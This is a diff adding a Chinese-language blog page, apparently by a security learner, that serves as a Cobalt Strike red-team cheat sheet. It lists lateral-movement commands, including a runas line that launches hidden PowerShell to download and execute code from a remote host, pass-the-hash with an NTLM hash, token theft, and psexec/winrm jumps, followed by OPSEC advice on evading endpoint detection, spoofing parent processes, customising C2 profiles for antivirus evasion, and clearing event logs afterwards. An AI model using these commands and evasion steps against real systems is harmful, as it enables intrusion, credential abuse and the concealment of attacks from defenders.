@@ -1,0 +1,42 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>Cobalt-Strike-CheatSheet · yutian - 网安学习中...</title><meta name="description" content="Cobalt-Strike-CheatSheet - yutian"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/gandalfr.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/styles/solarized-light.min.css"><link rel="search" type="application/opensearchdescription+xml" href="https://yutianqaq.github.io/atom.xml" title="yutian - 网安学习中..."><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yutian - 网安学习中..." type="application/atom+xml">
+</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/logo.jpg" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://github.com/yutianqaq" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Cobalt-Strike-CheatSheet</h1><div class="tags"></div><div class="post-info">Sep 6, 2023</div><div class="post-content"><h1 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h1><p>立足点使用 http(s) 监听器</p>
+<p>横向移动主机使用 smb 监听器（有助于在网络中隐匿流量）</p>
+<ul>
+<li>使用 <code>dir \\.\pipe\</code> 显示 pipe 名称，在创建 pipe 名称时选用相似的</li>
+</ul>
+<p>权限提升使用 bind tcp 监听器</p>
+<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="runas"><a href="#runas" class="headerlink" title="runas"></a>runas</h2><p>使用凭据，可以作为另一个用户运行命令。</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas redteam\Administrator P@ssw0rd123! Powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.50.90:80&#x2F;filename&#39;))&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>通过提供用户名和 NTLM 哈希，执行Pass The hash攻击并在当前进程上注入 TGT。</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pth Administrator 97fc053bc0b23588798277b22540c40d</span><br><span class="line">pth CORP\Administrator 97fc053bc0b23588798277b22540c40d</span><br></pre></td></tr></table></figure>
+
+<h2 id="steal-token"><a href="#steal-token" class="headerlink" title="steal_token"></a>steal_token</h2><p>从指定进程中窃取令牌。</p>
+<h2 id="make-token"><a href="#make-token" class="headerlink" title="make_token"></a>make_token</h2><p>通过提供凭据，可以在当前进程中创建模拟令牌，并从模拟用户的上下文中执行命令。</p>
+<h2 id="jump"><a href="#jump" class="headerlink" title="jump"></a>jump</h2><p>可以使用 winrm 或 psexec 在目标上生成新的信标会话。</p>
+<p>跳转模块将使用当前委派&#x2F;模拟令牌在远程目标上进行身份验证。</p>
+<p>我们可以将跳转模块与 make_token 或 pth 模块相结合，以便快速 jump 到网络上的另一个目标。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump [psexec64,psexec,psexec_psh,winrm64,winrm] [server&#x2F;workstation] [listener]</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jump psexec64 DC01 HTTPS</span><br><span class="line">jump winrm WS04 SMB</span><br><span class="line">jump psexec_psh SQL01 DNS</span><br></pre></td></tr></table></figure>
+
+<h2 id="remote-execute"><a href="#remote-execute" class="headerlink" title="remote-execute"></a>remote-execute</h2><p>使用 psexec、winrm 或wmi 在远程目标上执行命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote-exec [method] [target] [command]</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote-exec psexec DC01 hostname</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="OPSEC"><a href="#OPSEC" class="headerlink" title="OPSEC"></a>OPSEC</h1><p>会话准备：在我们得到主机权限后，在进行任何利用后渗透利用之前，我们应该准备好我们的信标，以隐匿行动，这样我们将生成尽可能少的IOC（破坏指标）。要做到这一点，我们可以使用 spawnto 模块来指定我们的子进程将使用哪个二进制文件来执行利用后操作，还可以使用“ppid”模块来欺骗我们的子过程将在其下生成的父进程。这两个技巧都将为我们提供大量的隐身能力，并将隐藏我们在受损主机上的存在。</p>
+<p>环境行为混合：在利用后的环境中，即使我们使用http（s）协议与环境的流量混合，一个好的端点安全解决方案或下一代防火墙也可以发现一些流量在这个环境中不常见，并且可能会阻止并创建SOC端点的遥测，供蓝色团队检查。这就是 Malable C2 配置文件的来源，它是每个 Cobalt Strike 团队服务器都可以使用的配置文件，它为信标的流量、进程注入、进程生成、行为、防病毒规避等提供了定制和灵活性。因此，最佳做法是<strong>永远不要使用默认信标行为</strong>，每次评估都要使用自定义配置文件。</p>
+<h1 id="后渗透技巧"><a href="#后渗透技巧" class="headerlink" title="后渗透技巧"></a>后渗透技巧</h1><p>在执行任何事情之前，请确保清楚它的行为以及它生成的 IOC（妥协指标）。</p>
+<p>尽量不要接触磁盘，大部分时间都在内存中操作(execute-assembly、bof)。</p>
+<p>检查 AppLocker 策略以确定可以执行的文件类型以及从哪个位置执行的文件。</p>
+<p>在完成利用后渗透利用后立即清理。</p>
+<p>使用主机完成后清理事件日志。</p>
+<p>更多请参考 <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm" target="_blank" rel="noopener">Cobalt Strike User Guide</a></p>
+</div></article></div></main><footer><div class="paginator"><a href="/2023/09/06/Beacon%20Object%20Files%20Dev/" class="prev">PREV</a><a href="/2023/08/30/hello-world/" class="next">NEXT</a></div><div class="copyright"><p>© 2023 <a href="https://yutianqaq.github.io">yutian</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/MikeCoder/hexo-theme-gandalfr" target="_blank">hexo-theme-gandalfr</a>.</p><span id="busuanzi_container_site_pv"> </span>本站总访问量<span id="busuanzi_value_site_pv"> </span>次<span id="busuanzi_container_site_uv"> </span>本站总访客量<span id="busuanzi_value_site_uv"> </span>次</div></footer></div><script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js" crossorigin="anonymous"></script><script src="//cdn.bootcss.com/jquery/3.1.1/jquery.js" crossorigin="anonymous"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>$(document).ready(function() { hljs.configure({useBR: true}); $('pre').each(function(i, block) { hljs.highlightBlock(block); }); });</script></body></html>
